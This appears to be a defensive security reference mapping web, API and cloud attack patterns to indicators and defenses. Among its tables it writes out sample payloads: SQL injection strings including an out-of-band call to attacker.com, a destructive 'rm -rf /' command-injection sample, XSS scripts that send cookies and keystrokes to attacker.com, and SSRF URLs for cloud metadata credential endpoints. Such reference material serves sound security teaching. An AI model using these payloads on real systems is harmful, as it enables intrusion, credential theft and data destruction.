# Attack Patterns by Component

## Web Application Attacks

### Authentication

| Attack | Description | Indicators |
|--------|-------------|------------|
| Brute Force | Try many passwords | High login failure rate |
| Credential Stuffing | Use leaked credentials | Distributed login attempts |
| Password Spraying | Few passwords, many accounts | Failed logins across users |
| Session Hijacking | Steal session token | Same session, different IP |
| Session Fixation | Set victim's session ID | Session ID in URL |

**Attack Tree: Authentication Bypass**

```
Goal: Access account without credentials
├── Steal credentials
│   ├── Phishing
│   ├── Keylogger
│   └── Data breach reuse
├── Bypass authentication
│   ├── SQL injection in login
│   ├── Authentication logic flaw
│   └── Default credentials
├── Steal session
│   ├── XSS to steal cookie
│   ├── Session in URL (referer leak)
│   └── Network sniffing (no HTTPS)
└── Social engineering
    ├── Password reset manipulation
    └── Support desk impersonation
```

### Authorization

| Attack | Description | Example |
|--------|-------------|---------|
| IDOR | Access other users' resources | `/api/users/123` → `/api/users/124` |
| Privilege Escalation | Gain higher privileges | Change `role=user` to `role=admin` |
| Forced Browsing | Access unlinked pages | Guess `/admin/dashboard` URL |
| Parameter Tampering | Modify auth parameters | Change `isAdmin=false` in request |

**Attack Tree: Unauthorized Access**

```
Goal: Access resources without authorization
├── Horizontal escalation (other users)
│   ├── IDOR via predictable IDs
│   ├── Missing authorization check
│   └── Mass assignment vulnerability
├── Vertical escalation (higher privilege)
│   ├── Modify role in JWT
│   ├── Access admin endpoints
│   └── SQL injection to change role
└── Logic flaws
    ├── Race condition in checkout
    ├── Negative quantity exploit
    └── State machine bypass
```

### Injection

| Attack | Target | Payload Example |
|--------|--------|-----------------|
| SQL Injection | Database queries | `' OR '1'='1` |
| XSS | Browser/DOM | `<script>alert(1)</script>` |
| Command Injection | OS commands | `; rm -rf /` |
| LDAP Injection | Directory queries | `*)(objectClass=*)` |
| Template Injection | Template engines | `{{7*7}}` |

**SQL Injection Variants:**

```sql
-- Authentication bypass
' OR '1'='1' --

-- Union-based data extraction
' UNION SELECT username, password FROM users --

-- Blind boolean-based
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --

-- Time-based blind
' AND SLEEP(5) --

-- Out-of-band
'; EXEC xp_dirtree '\\attacker.com\share' --
```

### Cross-Site Scripting (XSS)

| Type | Location | Persistence |
|------|----------|-------------|
| Reflected | URL parameters | None |
| Stored | Database | Permanent |
| DOM-based | Client-side JS | None |

**XSS Payloads:**

```javascript
// Basic
<script>alert('XSS')</script>

// Event handler
<img src=x onerror="alert('XSS')">

// SVG
<svg onload="alert('XSS')">

// DOM-based
location.hash.substring(1)

// Cookie theft
<script>
fetch('https://attacker.com/?c='+document.cookie)
</script>

// Keylogger
<script>
document.onkeypress=function(e){
  fetch('https://attacker.com/?k='+e.key)
}
</script>
```

## API Attacks

### REST API

| Attack | Target | Example |
|--------|--------|---------|
| Mass Assignment | Object properties | Add `isAdmin=true` to user update |
| Broken Object Level Auth | Resource access | Access any resource by ID |
| Rate Limit Bypass | API endpoints | Header manipulation |
| API Key Exposure | Client-side code | Key in JavaScript bundle |

**Attack Tree: API Abuse**

```
Goal: Extract or manipulate data via API
├── Authentication bypass
│   ├── Missing auth on endpoint
│   ├── Weak API key
│   └── JWT manipulation
├── Data extraction
│   ├── Excessive data in response
│   ├── Pagination bypass
│   └── GraphQL introspection
├── Rate limit bypass
│   ├── Rotate IPs
│   ├── Distribute across time
│   └── Header manipulation
└── Business logic abuse
    ├── Race conditions
    ├── Parameter pollution
    └── State manipulation
```

### GraphQL

| Attack | Description | Example |
|--------|-------------|---------|
| Introspection | Discover schema | `{__schema{types{name}}}` |
| Batching | Bypass rate limits | Multiple queries in one request |
| Deep nesting | DoS via complexity | Deeply nested query |
| Alias overload | Bypass field limits | Many aliases for same field |

## Infrastructure Attacks

### Container/Kubernetes

| Attack | Target | Impact |
|--------|--------|--------|
| Container Escape | Runtime | Host compromise |
| Secret Exposure | ConfigMaps/Secrets | Credential theft |
| Pod-to-Pod | Network | Lateral movement |
| RBAC Bypass | API Server | Cluster compromise |

### Cloud

| Attack | Target | Impact |
|--------|--------|--------|
| SSRF | Metadata service | Credential theft |
| Misconfigured Storage | S3/Blob | Data exposure |
| IAM Privilege Escalation | Cloud IAM | Account takeover |
| Resource Hijacking | Compute | Cryptomining |

**SSRF to Cloud Metadata:**

```
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/identity/oauth2/token
```

## Attack Indicators

### Logs to Monitor

| Attack | Log Pattern |
|--------|-------------|
| Brute force | Multiple failed logins, same user |
| Credential stuffing | Failed logins, many users, distributed IPs |
| SQL injection | SQL keywords in parameters |
| XSS | Script tags in inputs |
| Path traversal | `../` in paths |
| SSRF | Requests to internal IPs |

### Response Patterns

| Response | Possible Attack |
|----------|-----------------|
| Different timing | Timing attack, user enumeration |
| Error with details | Information disclosure |
| Unexpected redirect | Open redirect |
| Large response | Data exfiltration |
| 403 vs 404 inconsistency | Authorization bypass attempt |

## Defense Mapping

| Attack Category | Primary Defenses |
|-----------------|------------------|
| Injection | Input validation, parameterized queries |
| Broken Auth | MFA, session management, rate limiting |
| Sensitive Data | Encryption, access controls |
| XXE | Disable external entities |
| Access Control | Authorization checks on all endpoints |
| Misconfig | Security hardening, scanning |
| XSS | Output encoding, CSP |
| Deserialization | Input validation, integrity checks |
| Components | Dependency scanning, updates |
| Logging | Centralized logging, monitoring |
